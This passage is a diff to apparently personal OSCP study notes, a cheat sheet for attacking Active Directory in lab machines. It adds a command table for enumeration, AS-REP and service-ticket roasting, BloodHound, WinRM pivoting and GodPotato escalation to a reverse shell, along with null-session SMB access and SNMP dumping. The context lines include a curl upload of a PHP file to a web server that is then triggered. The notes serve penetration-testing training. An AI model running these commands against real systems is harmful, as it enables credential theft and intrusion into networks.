@@ -13,6 +13,20 @@ A chronological, phase-based tactical guide for Active Directory exploitation. S
 
 ---
 
+## 🧭 Quick Tactical Reference (The Flow)
+*For a concise table version, see: [AD_Tactical_Table.md](file:///c:/Users/roguf/.gemini/antigravity/scratch/oscp_notes/AD_Tactical_Table.md)*
+
+| Step | Command Pattern | Lab Context |
+| :--- | :--- | :--- |
+| **Triage** | `nxc smb [IP] -u [USER] -p [PASS] --users` | Users/Shares [Zeus/Medtech] |
+| **Roast (AS-REP)** | `impacket-GetNPUsers [DOM]/ -usersfile users.txt -request`| **NO PASS (Requires Userlist)** |
+| **Roast (Service)** | `impacket-GetUserSPNs [DOM]/[USER]:[PASS] -request`| **AUTH REQUIRED** |
+| **Blood** | `bloodhound-python ... -c All` | Pathfinding [Secura/Zeus] |
+| **Pivoting** | `nxc winrm [IP] -u [USER] -p [PASS] --local-auth`| Local Bypass [Secura/OSCPC] |
+| **PrivEsc** | `.\GodPotato-NET4.exe -cmd "[REV_SHELL]"` | System Shell [OSCPB/Hutch] |
+
+---
+
 ## ⚡ Quick Shell Cheat Sheet (One-Liners)
 *Rapid payload generation and trigger.*
 
@@ -53,10 +67,12 @@ A chronological, phase-based tactical guide for Active Directory exploitation. S
 ### 0.3. Unauthenticated Entry (Fallback)
 - **User Enumeration (Kerberos)** - **Do this:** Enumerate valid usernames via Kerberos:
   `kerbrute userenum -d corp.local --dc 192.168.100.10 /usr/share/wordlists/xato-net-10-million.txt`
-- **AS-REP Roasting** - **Do this:** Perform AS-REP Roasting for users with pre-auth disabled:
-  `impacket-GetNPUsers corp.local/ -usersfile users.txt -format hashcat -request`
+- **AS-REP Roasting (NO PASSWORD REQUIRED)** - **Do this:** Perform AS-REP Roasting for users with pre-auth disabled. Works with *only* a list of usernames.
+  `impacket-GetNPUsers corp.local/ -usersfile users.txt -format hashcat -request -dc-ip 192.168.100.10`
 - **Anonymous SMB Enumeration** - **Do this:** Check for anonymous SMB access and list shares:
   `nxc smb 192.168.100.10 -u '' -p '' --shares`
+- **Connect to Found Share** - **Do this:** Connect to an identified share without a password (Null session):
+  `smbclient //192.168.186.71/backups -N`
 - **Information Leakage Search** - **Do this:** Hunt for `.sql`, `.docx`, `.xml` files in shares:
   - `smbclient //192.168.100.10/Shared -U ''`
   - *HUNT*: `Onboarding.docx`, `Web.config`, `connection.sql` `[Zeus] [Flight] [Cicada]`.
@@ -68,6 +84,7 @@ A chronological, phase-based tactical guide for Active Directory exploitation. S
   2. **Upload (Kali)**: `curl -X PUT http://192.168.100.50/storage/download.php --data-binary @download.php`
   3. **Trigger**: Visit `http://192.168.100.20/storage/download.php` `[Feast]`.
 - **SNMP Custom Script Enumeration** - **Do this:** Check for custom scripts or passwords in SNMP `nsExtendObjects`:
+  - `snmpwalk -v 2c -c public [IP] .1.3.6` (Full MIB tree dump - **Brute Force Goal**)
   - `snmpwalk -v 2c -c public [IP] NET-SNMP-EXTEND-MIB::nsExtendObjects`
   - `snmpwalk -v 2c -c public [IP] .1.3.6.1.4.1.8072.1.3` (Manual OID fallback)
   - *HUNT*: Inspect `nsExtendOutputFull` for cleartext credentials or script outputs `[OSCPC]`.
